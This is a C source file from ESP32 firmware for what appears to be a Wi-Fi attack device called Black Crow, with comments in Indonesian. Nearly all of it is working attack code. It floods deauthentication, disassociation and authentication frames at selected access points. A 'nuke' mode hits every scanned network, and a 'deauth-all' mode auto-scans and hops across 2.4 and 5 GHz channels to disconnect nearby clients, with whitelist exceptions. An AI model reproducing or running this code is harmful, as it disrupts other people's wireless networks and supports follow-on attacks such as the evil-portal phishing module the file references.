/*
 * SPDX-FileCopyrightText: 2026 Black Crow Official Community Dxt and contributors
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

#include "attack.h"

#include <string.h>
#include <inttypes.h>

#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "esp_timer.h"
#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_rom_sys.h"

#include "io.h"
#include "frames.h"
#include "targets.h"
#include "acl.h"
#include "wifi_ctrl.h"
#include "ble_scanner.h"
#include "monitor.h"
#include "spectrum.h"
#include "wifi_live_scan.h"
#include "wifi_spam.h"
#include "evil_portal.h"

/* ============================================================
 * State global
 * ============================================================ */
static SemaphoreHandle_t s_lock = NULL;

static volatile bool s_running       = false;
static TaskHandle_t  s_task          = NULL;
static bool          s_is_nuke       = false;
static bool          s_is_deauth_all = false;

static uint32_t s_duration   = 0;
static uint32_t s_started_us = 0;
static uint32_t s_pkts_24    = 0;
static uint32_t s_pkts_5     = 0;
static uint32_t s_pkts_bl    = 0;

static volatile bool s_rescan_requested = false;

/* Mode deauth-all — di-set sebelum task start, dibaca oleh task */
static volatile dauth_all_mode_t s_dauth_all_mode = DAUTH_ALL_MODE_SKIP;

/* ============================================================
 * Helper
 * ============================================================ */
static uint32_t now_sec(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000000ULL);
}

static inline void lock(void)   { xSemaphoreTake(s_lock, portMAX_DELAY); }
static inline void unlock(void) { xSemaphoreGive(s_lock); }

static void task_exit_state(void)
{
    lock();
    s_running       = false;
    s_task          = NULL;
    s_is_nuke       = false;
    s_is_deauth_all = false;
    unlock();
}

/* Cek apakah AP punya minimal 1 STA whitelisted */
static bool ap_has_whitelisted_sta(const uint8_t *bssid)
{
    int sta_n = targets_sta_count();
    for (int k = 0; k < sta_n; k++) {
        target_sta_t s;
        if (targets_get_sta(k, &s) != 0) continue;
        if (memcmp(s.bssid, bssid, 6) != 0) continue;
        if (acl_wl_contains(s.mac)) return true;
    }
    return false;
}

/* ============================================================
 * attack_burst_for_ap
 * ============================================================ */
static uint32_t attack_burst_for_ap(const target_ap_t *ap, attack_mode_t mode)
{
    if (acl_wl_contains(ap->bssid)) return 0;
    uint32_t sent = 0;

    bool downgrade_to_unicast = ap_has_whitelisted_sta(ap->bssid);
    int sta_n = targets_sta_count();

    switch (mode) {
        case ATTACK_MODE_BROADCAST:
        case ATTACK_MODE_DISASSOC: {
            uint8_t subtype_disassoc = (mode == ATTACK_MODE_DISASSOC);
            if (downgrade_to_unicast) {
                for (int i = 0; i < sta_n && s_running; i++) {
                    target_sta_t s;
                    if (targets_get_sta(i, &s) != 0) continue;
                    if (memcmp(s.bssid, ap->bssid, 6) != 0) continue;
                    if (acl_wl_contains(s.mac)) continue;
                    if (subtype_disassoc)
                        sent += frames_burst_disassoc(ap->channel, s.mac, ap->bssid);
                    else
                        sent += frames_burst_deauth(ap->channel, s.mac, ap->bssid);
                }
            } else {
                if (subtype_disassoc)
                    sent += frames_burst_disassoc(ap->channel, MAC_BROADCAST, ap->bssid);
                else
                    sent += frames_burst_deauth(ap->channel, MAC_BROADCAST, ap->bssid);
            }
            break;
        }

        case ATTACK_MODE_UNICAST: {
            target_sta_t s;
            if (targets_get_selected_sta(&s)) {
                if (!acl_wl_contains(s.mac) && !acl_wl_contains(s.bssid)) {
                    sent += frames_burst_deauth(s.channel, s.mac, s.bssid);
                }
            }
            break;
        }

        case ATTACK_MODE_AUTHFLOOD:
            sent += frames_burst_auth_flood(ap->channel, ap->bssid);
            break;

        case ATTACK_MODE_MIXED:
            if (downgrade_to_unicast) {
                for (int i = 0; i < sta_n && s_running; i++) {
                    target_sta_t s;
                    if (targets_get_sta(i, &s) != 0) continue;
                    if (memcmp(s.bssid, ap->bssid, 6) != 0) continue;
                    if (acl_wl_contains(s.mac)) continue;
                    sent += frames_burst_deauth(ap->channel, s.mac, ap->bssid);
                    sent += frames_burst_disassoc(ap->channel, s.mac, ap->bssid);
                }
            } else {
                sent += frames_burst_deauth(ap->channel, MAC_BROADCAST, ap->bssid);
                sent += frames_burst_disassoc(ap->channel, MAC_BROADCAST, ap->bssid);
            }
            if (s_running)
                sent += frames_burst_auth_flood(ap->channel, ap->bssid);
            break;

        case ATTACK_MODE_DEAUTH_ALL:
            break;
    }
    return sent;
}

/* ============================================================
 * blacklist_pass
 * ============================================================ */
static uint32_t blacklist_pass(void)
{
    uint32_t sent = 0;

    int sta_n = targets_sta_count();
    for (int i = 0; i < sta_n && s_running; i++) {
        target_sta_t s;
        if (targets_get_sta(i, &s) != 0) continue;
        if (!acl_bl_contains(s.mac)) continue;
        if (acl_wl_contains(s.mac)) continue;
        sent += frames_burst_deauth(s.channel, s.mac, s.bssid);
    }

    int bl_n = acl_bl_count();
    for (int i = 0; i < bl_n && s_running; i++) {
        uint8_t mac[6];
        acl_kind_t kind;
        if (acl_bl_get(i, mac, &kind) != 0) continue;
        if (kind != ACL_KIND_BSSID) continue;
        if (acl_wl_contains(mac)) continue;

        int aps = targets_ap_count();
        for (int j = 0; j < aps; j++) {
            target_ap_t ap;
            if (targets_get_ap(j, &ap) != 0) continue;
            if (memcmp(ap.bssid, mac, 6) != 0) continue;
            sent += frames_burst_deauth(ap.channel, MAC_BROADCAST, ap.bssid);
            break;
        }
    }
    return sent;
}

/* ============================================================
 * Task: attack (mixed, selected APs)
 * ============================================================ */
static void attack_task(void *arg)
{
    (void)arg;

    lock();
    s_started_us = (uint32_t)(esp_timer_get_time() / 1000000ULL);
    s_pkts_24 = s_pkts_5 = s_pkts_bl = 0;
    uint32_t duration = s_duration;
    unlock();

    frames_reset_tx_counters();

    int n = targets_sel_count();
    io_log("attack: start mode=mixed duration=%us aps=%d\r\n",
           (unsigned)duration, n);

    if (n == 0) {
        io_log("attack: no APs selected\r\n");
        task_exit_state();
        vTaskDelete(NULL);
        return;
    }

    uint32_t last_log = 0;
    while (s_running) {
        uint32_t elapsed = now_sec() - s_started_us;
        if (duration > 0 && elapsed >= duration) break;

        for (int i = 0; i < n && s_running; i++) {
            target_ap_t ap;
            if (targets_get_sel_ap(i, &ap) != 0) continue;
            uint32_t sent = attack_burst_for_ap(&ap, ATTACK_MODE_MIXED);
            if (ap.band_5ghz) s_pkts_5  += sent;
            else              s_pkts_24 += sent;
            vTaskDelay(pdMS_TO_TICKS(5));
        }

        s_pkts_bl += blacklist_pass();
        vTaskDelay(pdMS_TO_TICKS(2));

        elapsed = now_sec() - s_started_us;
        if (elapsed - last_log >= 2) {
            last_log = elapsed;
            uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
            io_log("attack: %us  aps=%d  total=%" PRIu32 "  pps=%.0f  "
                   "tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
                   (unsigned)elapsed, n, total,
                   (float)total / (float)(elapsed > 0 ? elapsed : 1),
                   frames_get_tx_ok_count(), frames_get_tx_fail_count());
        }
    }

    uint32_t total_time = now_sec() - s_started_us;
    uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
    io_log("attack: stopped after %us  total=%" PRIu32 "  avg_pps=%.0f  "
           "tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
           (unsigned)total_time, total,
           (float)total / (float)(total_time > 0 ? total_time : 1),
           frames_get_tx_ok_count(), frames_get_tx_fail_count());

    task_exit_state();
    vTaskDelete(NULL);
}

/* ============================================================
 * Task: nuke (mixed, ALL scanned APs)
 * ============================================================ */
static void attack_nuke_task(void *arg)
{
    (void)arg;

    lock();
    s_started_us = (uint32_t)(esp_timer_get_time() / 1000000ULL);
    s_pkts_24 = s_pkts_5 = s_pkts_bl = 0;
    uint32_t duration = s_duration;
    unlock();

    frames_reset_tx_counters();

    int n = targets_ap_count();
    io_log("attack: start mode=nuke duration=%us aps=%d\r\n",
           (unsigned)duration, n);

    uint32_t last_log = 0;
    while (s_running) {
        uint32_t elapsed = now_sec() - s_started_us;
        if (elapsed >= duration) break;

        n = targets_ap_count();
        for (int i = 0; i < n && s_running; i++) {
            target_ap_t ap;
            if (targets_get_ap(i, &ap) != 0) continue;
            uint32_t sent = attack_burst_for_ap(&ap, ATTACK_MODE_MIXED);
            if (ap.band_5ghz) s_pkts_5  += sent;
            else              s_pkts_24 += sent;
            vTaskDelay(pdMS_TO_TICKS(3));
        }

        s_pkts_bl += blacklist_pass();
        vTaskDelay(pdMS_TO_TICKS(2));

        elapsed = now_sec() - s_started_us;
        if (elapsed - last_log >= 2) {
            last_log = elapsed;
            uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
            io_log("nuke: %us  aps=%d  pkts=%" PRIu32 "  pps=%.0f  "
                   "tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
                   (unsigned)elapsed, n, total,
                   (float)total / (float)(elapsed > 0 ? elapsed : 1),
                   frames_get_tx_ok_count(), frames_get_tx_fail_count());
        }
    }

    uint32_t total_time = now_sec() - s_started_us;
    uint32_t total = s_pkts_24 + s_pkts_5 + s_pkts_bl;
    io_log("attack: stopped after %us  total=%" PRIu32 "  avg_pps=%.0f  "
           "tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
           (unsigned)total_time, total,
           (float)total / (float)(total_time > 0 ? total_time : 1),
           frames_get_tx_ok_count(), frames_get_tx_fail_count());

    task_exit_state();
    vTaskDelete(NULL);
}

/* ============================================================
 * Task: DEAUTH-ALL — mode SKIP atau UNICAST
 *
 * Hanya menyinggahi channel yang benar-benar ditempati AP hasil scan
 * (bukan menyapu 38 channel), jadi tiap target di-revisit jauh lebih
 * sering → lebih responsif. Band PHY (2.4/5 GHz) dikunci lewat
 * esp_wifi_set_band_mode() sebelum set_channel + TX supaya frame 5 GHz
 * benar-benar keluar di band yang tepat (pola sama seperti monitor.c /
 * wifi_live_scan.c). Format baris log DIJAGA tetap — Flutter mem-parse-nya.
 * ============================================================ */
#define DEAUTH_ALL_DWELL_MS          6      /* yield per channel (feed WDT)     */
#define DEAUTH_ALL_SETTLE_US         2000   /* settle set_channel intra-band    */
#define DEAUTH_ALL_BAND_SETTLE_US    3500   /* settle ekstra sesudah ganti band */
#define DEAUTH_ALL_FRAME_THROTTLE_MS 100    /* throttle LOG saja, bukan TX      */
#define DEAUTH_ALL_BURST             3      /* frame deauth per AP per kunjungan */
#define DEAUTH_ALL_IDLE_SLEEP_MS     250    /* tidur saat tak ada target di udara */

/* Kumpulkan channel unik yang ditempati AP: 2.4 GHz dulu, lalu 5 GHz,
 * supaya band PHY cukup di-switch sekali per arah tiap cycle. */
static int da_collect_channels(uint8_t *ch_out, bool *is5_out, int max)
{
    int n = 0;
    int ap_n = targets_ap_count();
    for (int pass = 0; pass < 2; pass++) {
        bool want5 = (pass == 1);
        for (int i = 0; i < ap_n && n < max; i++) {
            target_ap_t ap;
            if (targets_get_ap(i, &ap) != 0) continue;
            if (ap.channel == 0) continue;
            bool is5 = (ap.channel > 14);
            if (is5 != want5) continue;
            bool dup = false;
            for (int j = 0; j < n; j++)
                if (ch_out[j] == ap.channel) { dup = true; break; }
            if (dup) continue;
            ch_out[n]  = ap.channel;
            is5_out[n] = is5;
            n++;
        }
    }
    return n;
}

/* Log satu FRAME (di-throttle). Format dijaga tetap untuk parser Flutter. */
static void da_log_frame(uint8_t ch, const uint8_t *dst, const uint8_t *src,
                         bool unicast, uint32_t *last_ms)
{
    uint32_t now_ms = (uint32_t)(esp_timer_get_time() / 1000);
    if (now_ms - *last_ms < DEAUTH_ALL_FRAME_THROTTLE_MS) return;
    *last_ms = now_ms;
    io_log("deauthall: FRAME ch=%u "
           "dst=%02X:%02X:%02X:%02X:%02X:%02X "
           "src=%02X:%02X:%02X:%02X:%02X:%02X "
           "reason=0x07%s\r\n",
           (unsigned)ch,
           dst[0], dst[1], dst[2], dst[3], dst[4], dst[5],
           src[0], src[1], src[2], src[3], src[4], src[5],
           unicast ? " (unicast)" : "");
}

/* Kirim burst deauth ke satu AP (hormati ACL whitelist + mode). */
static void da_hit_ap(const target_ap_t *ap, uint8_t ch, bool is5,
                      dauth_all_mode_t mode, uint32_t *last_frame_ms)
{
    if (acl_wl_contains(ap->bssid)) return;

    bool has_wl = ap_has_whitelisted_sta(ap->bssid);

    /* Mode SKIP: lewati AP sepenuhnya kalau ada STA whitelisted. */
    if (mode == DAUTH_ALL_MODE_SKIP && has_wl) return;

    /* Broadcast bila tak ada STA whitelisted (berlaku SKIP & UNICAST). */
    if (!has_wl) {
        for (int b = 0; b < DEAUTH_ALL_BURST && s_running; b++) {
            if (frames_send_deauth_broadcast(ap->bssid, 0x0007)) {
                if (is5) s_pkts_5++;
                else     s_pkts_24++;
            }
        }
        da_log_frame(ch, MAC_BROADCAST, ap->bssid, false, last_frame_ms);
        return;
    }

    /* Mode UNICAST + ada STA whitelisted: deauth per STA non-whitelisted. */
    int sta_n = targets_sta_count();
    for (int k = 0; k < sta_n && s_running; k++) {
        target_sta_t s;
        if (targets_get_sta(k, &s) != 0) continue;
        if (memcmp(s.bssid, ap->bssid, 6) != 0) continue;
        if (acl_wl_contains(s.mac)) continue;
        for (int b = 0; b < DEAUTH_ALL_BURST && s_running; b++) {
            uint32_t before = frames_get_tx_ok_count();
            frames_send_deauth(s.mac, ap->bssid, 0x0007);
            if (frames_get_tx_ok_count() > before) {
                if (is5) s_pkts_5++;
                else     s_pkts_24++;
            }
        }
        da_log_frame(ch, s.mac, ap->bssid, true, last_frame_ms);
    }
}

static void attack_deauth_all_task(void *arg)
{
    (void)arg;

    lock();
    s_started_us = (uint32_t)(esp_timer_get_time() / 1000000ULL);
    s_pkts_24 = s_pkts_5 = s_pkts_bl = 0;
    uint32_t duration = s_duration;
    dauth_all_mode_t mode = s_dauth_all_mode;   /* snapshot */
    unlock();

    frames_reset_tx_counters();

    /* Precondition TX: promiscuous ON + mulai dari band AUTO (lih. wifi_spam). */
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);

    uint8_t occ_ch[TARGETS_MAX_APS];
    bool    occ_is5[TARGETS_MAX_APS];
    int     occ_n = da_collect_channels(occ_ch, occ_is5, TARGETS_MAX_APS);

    int aps_total = targets_ap_count();
    io_log("deauthall: START duration=%us channels=%d aps=%d mode=%s\r\n",
           (unsigned)duration, occ_n, aps_total,
           mode == DAUTH_ALL_MODE_UNICAST ? "unicast" : "skip");

    uint32_t last_stat = 0;
    uint32_t last_frame_report_ms = 0;
    int     cycle_count = 0;
    uint8_t cur_ch  = 0;        /* 0 = band PHY belum terkunci */
    bool    cur_is5 = false;
    bool    idle_noted = false;

    /* Cold start tanpa target ter-scan: picu satu auto-scan di awal supaya
     * deauth-all yang dijalankan langsung dari layar khususnya (atau dari CLI)
     * menyerang AP di sekitar TANPA harus lebih dulu men-scan lewat layar
     * Nuke/Network yang mengisi tabel target bersama. Memakai ulang jalur
     * rescan yang sama (emit "RESCAN start" → SCAN_AP → SCAN_DONE, rebuild
     * daftar channel, reset band), sehingga parser Flutter & indikator
     * SCANNING ikut sinkron. Hanya saat tabel kosong — bila target sudah ada
     * (mis. dari live scan Nuke) kita langsung menyerang tanpa delay scan. */
    if (occ_n == 0) {
        s_rescan_requested = true;
    }

    while (s_running) {
        /* ---- Cek permintaan rescan manual ---- */
        if (s_rescan_requested) {
            s_rescan_requested = false;

            uint32_t t0 = now_sec();
            io_log("deauthall: RESCAN start\r\n");

            int scanned = wifi_ctrl_scan();

            uint32_t dt = now_sec() - t0;
            int n_ap = targets_ap_count();

            for (int i = 0; i < n_ap; i++) {
                target_ap_t ap;
                if (targets_get_ap(i, &ap) != 0) continue;
                io_log("deauthall: SCAN_AP idx=%d ssid=%s "
                       "bssid=%02X:%02X:%02X:%02X:%02X:%02X "
                       "ch=%u rssi=%d band=%s\r\n",
                       i, ap.ssid,
                       ap.bssid[0], ap.bssid[1], ap.bssid[2],
                       ap.bssid[3], ap.bssid[4], ap.bssid[5],
                       (unsigned)ap.channel, (int)ap.rssi,
                       ap.band_5ghz ? "5" : "2.4");
            }
            io_log("deauthall: SCAN_DONE total=%d took=%us\r\n",
                   scanned > 0 ? scanned : n_ap, (unsigned)dt);

            /* wifi_ctrl_scan() meninggalkan band di AUTO; rebuild daftar
             * channel & paksa kunci band ulang di hop berikutnya. */
            esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
            occ_n      = da_collect_channels(occ_ch, occ_is5, TARGETS_MAX_APS);
            cur_ch     = 0;
            idle_noted = false;
        }

        uint32_t elapsed = now_sec() - s_started_us;
        if (duration > 0 && elapsed >= duration) break;

        /* ---- Tak ada AP di udara: idle, jangan busy-spin ---- */
        if (occ_n == 0) {
            if (!idle_noted) {
                io_log("deauthall: no targets — idle "
                       "(scan / aktifkan auto-rescan)\r\n");
                idle_noted = true;
            }
            if (elapsed - last_stat >= 2) {
                last_stat = elapsed;
                uint32_t total = s_pkts_24 + s_pkts_5;
                uint32_t pps = (elapsed > 0) ? (total / elapsed) : 0;
                io_log("deauthall: %us  ch=0(2.4)  cycles=%d  total=%" PRIu32
                       "  pps=%" PRIu32 "  tx_ok=%" PRIu32
                       "  tx_fail=%" PRIu32 "\r\n",
                       (unsigned)elapsed, cycle_count, total, pps,
                       frames_get_tx_ok_count(), frames_get_tx_fail_count());
            }
            vTaskDelay(pdMS_TO_TICKS(DEAUTH_ALL_IDLE_SLEEP_MS));
            continue;
        }

        /* ---- Satu pass penuh atas channel yang ditempati ---- */
        for (int c = 0; c < occ_n && s_running; c++) {
            uint8_t ch  = occ_ch[c];
            bool    is5 = occ_is5[c];

            /* Kunci band PHY sesuai channel SEBELUM set_channel + TX. */
            bool band_changed = (cur_ch == 0) || (is5 != cur_is5);
            if (band_changed) {
                esp_wifi_set_band_mode(is5 ? WIFI_BAND_MODE_5G_ONLY
                                           : WIFI_BAND_MODE_2G_ONLY);
            }

            esp_err_t ch_err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            if (ch_err != ESP_OK) {
                continue;   /* channel tak bisa di-tune di band ini */
            }
            esp_rom_delay_us(band_changed ? DEAUTH_ALL_BAND_SETTLE_US
                                          : DEAUTH_ALL_SETTLE_US);
            cur_ch  = ch;
            cur_is5 = is5;

            int ap_n = targets_ap_count();
            for (int i = 0; i < ap_n && s_running; i++) {
                target_ap_t ap;
                if (targets_get_ap(i, &ap) != 0) continue;
                if (ap.channel != ch) continue;
                da_hit_ap(&ap, ch, is5, mode, &last_frame_report_ms);
            }

            vTaskDelay(pdMS_TO_TICKS(DEAUTH_ALL_DWELL_MS));

            elapsed = now_sec() - s_started_us;
            if (duration > 0 && elapsed >= duration) break;

            if (elapsed - last_stat >= 2) {
                last_stat = elapsed;
                uint32_t total = s_pkts_24 + s_pkts_5;
                uint32_t pps = (elapsed > 0) ? (total / elapsed) : 0;
                io_log("deauthall: %us  ch=%u(%s)  cycles=%d  total=%" PRIu32
                       "  pps=%" PRIu32 "  tx_ok=%" PRIu32
                       "  tx_fail=%" PRIu32 "\r\n",
                       (unsigned)elapsed, (unsigned)ch, is5 ? "5G" : "2.4",
                       cycle_count, total, pps,
                       frames_get_tx_ok_count(), frames_get_tx_fail_count());
            }
        }

        cycle_count++;
    }

    /* Kembalikan band ke AUTO supaya fitur lain tidak terkunci di satu band. */
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);

    uint32_t total_time = now_sec() - s_started_us;
    uint32_t total = s_pkts_24 + s_pkts_5;
    uint32_t avg_pps = (total_time > 0) ? (total / total_time) : 0;
    io_log("deauthall: STOPPED after %us  cycles=%d  total=%" PRIu32 "  "
           "avg_pps=%" PRIu32 "  tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
           (unsigned)total_time, cycle_count, total, avg_pps,
           frames_get_tx_ok_count(), frames_get_tx_fail_count());

    task_exit_state();
    vTaskDelete(NULL);
}

/* ============================================================
 * Public API
 * ============================================================ */
void attack_init(void)
{
    s_lock = xSemaphoreCreateMutex();
    s_running          = false;
    s_is_nuke          = false;
    s_is_deauth_all    = false;
    s_task             = NULL;
    s_rescan_requested = false;
    s_dauth_all_mode   = DAUTH_ALL_MODE_SKIP;
}

static bool start_task_common(TaskFunction_t fn, const char *name,
                              bool is_nuke, bool is_deauth_all,
                              uint32_t duration)
{
    if (!s_lock) {
        io_log("attack: not initialized\r\n");
        return false;
    }

    /* Exclusive radio users must yield before a WiFi attack takes over
     * the channel. (BLE spam over ext-adv is allowed to run alongside.) */
    if (monitor_is_running()) {
        io_log("attack: stopping monitor first\r\n");
        monitor_stop();
    }
    if (spectrum_is_running()) {
        io_log("attack: stopping spectrum first\r\n");
        spectrum_stop();
    }
    if (wifi_live_scan_is_running()) {
        io_log("attack: stopping WiFi live scan first\r\n");
        wifi_live_scan_stop();
    }
    if (wifi_spam_is_running()) {
        io_log("attack: stopping WiFi spam first\r\n");
        wifi_spam_stop();
    }
    if (evil_portal_is_running()) {
        io_log("attack: stopping evil portal first\r\n");
        evil_portal_stop();
    }
    if (ble_scanner_is_running()) {
        io_log("attack: stopping BLE scan first\r\n");
        ble_scanner_stop();
    }

    lock();
    if (s_running || s_task != NULL) {
        unlock();
        io_log("attack: already running\r\n");
        return false;
    }
    s_duration         = duration;
    s_is_nuke          = is_nuke;
    s_is_deauth_all    = is_deauth_all;
    s_running          = true;
    s_rescan_requested = false;

    TaskHandle_t handle = NULL;
    BaseType_t rc = xTaskCreate(fn, name, 8192, NULL, 3, &handle);
    if (rc != pdPASS) {
        s_running       = false;
        s_is_nuke       = false;
        s_is_deauth_all = false;
        s_task          = NULL;
        unlock();
        io_log("%s: task create failed\r\n", name);
        return false;
    }
    s_task = handle;
    unlock();
    return true;
}

bool attack_nuke_start(uint32_t duration_seconds)
{
    if (targets_ap_count() == 0) {
        io_log("nuke: no APs — run scan first\r\n");
        return false;
    }
    if (duration_seconds < 1)    duration_seconds = 1;
    if (duration_seconds > 3600) duration_seconds = 3600;
    return start_task_common(attack_nuke_task, "nuke",
                             true, false, duration_seconds);
}

bool attack_start(uint32_t duration_seconds)
{
    if (targets_sel_count() == 0) {
        io_log("attack: no APs selected\r\n");
        return false;
    }
    return start_task_common(attack_task, "attack",
                             false, false, duration_seconds);
}

bool attack_deauth_all_start(uint32_t duration_seconds)
{
    return attack_deauth_all_start_mode(duration_seconds,
                                        DAUTH_ALL_MODE_SKIP);
}

bool attack_deauth_all_start_mode(uint32_t duration_seconds,
                                  dauth_all_mode_t mode)
{
    if (targets_ap_count() == 0) {
        io_log("deauthall: note — belum ada AP ter-scan; task idle "
               "sampai scan/rescan mengisi target\r\n");
    }

    /* Warning: STA list kosong */
    if (targets_sta_count() == 0) {
        if (mode == DAUTH_ALL_MODE_UNICAST) {
            io_log("deauthall: WARNING — mode=unicast tapi STA list kosong.\r\n");
            io_log("deauthall: Jalankan `sniff <ap_idx> <sec>` dulu, "
                   "atau unicast akan fallback ke broadcast.\r\n");
        } else {
            io_log("deauthall: note — STA list kosong; "
                   "whitelist STA tidak akan efektif tanpa sniff.\r\n");
        }
    }

    if (duration_seconds < 1)    duration_seconds = 1;
    if (duration_seconds > 3600) duration_seconds = 3600;

    /* Set mode sebelum task start */
    s_dauth_all_mode = mode;

    return start_task_common(attack_deauth_all_task, "deauth_all",
                             false, true, duration_seconds);
}

void attack_deauth_all_rescan(void)
{
    if (!s_running || !s_is_deauth_all) {
        io_log("deauthall: not running — use `scan` instead\r\n");
        return;
    }
    s_rescan_requested = true;
}

void attack_stop(void)
{
    if (!s_lock) return;

    lock();
    if (!s_running) {
        unlock();
        io_log("attack: not running\r\n");
        return;
    }
    s_running          = false;
    s_rescan_requested = false;
    unlock();

    io_log("attack: stop requested\r\n");

    for (int i = 0; i < 100; i++) {
        lock();
        bool done = (s_task == NULL);
        unlock();
        if (done) return;
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    lock();
    bool stuck = (s_task != NULL);
    unlock();
    if (stuck) {
        io_log("attack: warning — task did not exit in 1s\r\n");
    }
}

bool attack_is_running(void)
{
    return s_running;
}

void attack_print_status(void)
{
    lock();
    bool running     = s_running;
    bool is_nuke     = s_is_nuke;
    bool is_da       = s_is_deauth_all;
    uint32_t start   = s_started_us;
    uint32_t p24     = s_pkts_24;
    uint32_t p5      = s_pkts_5;
    uint32_t pbl     = s_pkts_bl;
    dauth_all_mode_t dauth_mode = s_dauth_all_mode;
    unlock();

    if (!running) {
        io_log("status: idle  tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
               frames_get_tx_ok_count(), frames_get_tx_fail_count());
        return;
    }

    uint32_t elapsed = now_sec() - start;
    uint32_t total = p24 + p5 + pbl;
    uint32_t pps = (elapsed > 0) ? (total / elapsed) : 0;

    const char *mname;
    if (is_da) {
        mname = (dauth_mode == DAUTH_ALL_MODE_UNICAST)
                ? "deauthall/unicast" : "deauthall/skip";
    } else {
        mname = is_nuke ? "nuke" : "mixed";
    }
    int aps = is_da ? targets_ap_count() :
              (is_nuke ? targets_ap_count() : targets_sel_count());

    io_log("status: running  mode=%s  elapsed=%us  aps=%d  pkts=%" PRIu32 "  "
           "pps=%" PRIu32 "  tx_ok=%" PRIu32 "  tx_fail=%" PRIu32 "\r\n",
           mname, (unsigned)elapsed, aps, total, pps,
           frames_get_tx_ok_count(), frames_get_tx_fail_count());
}
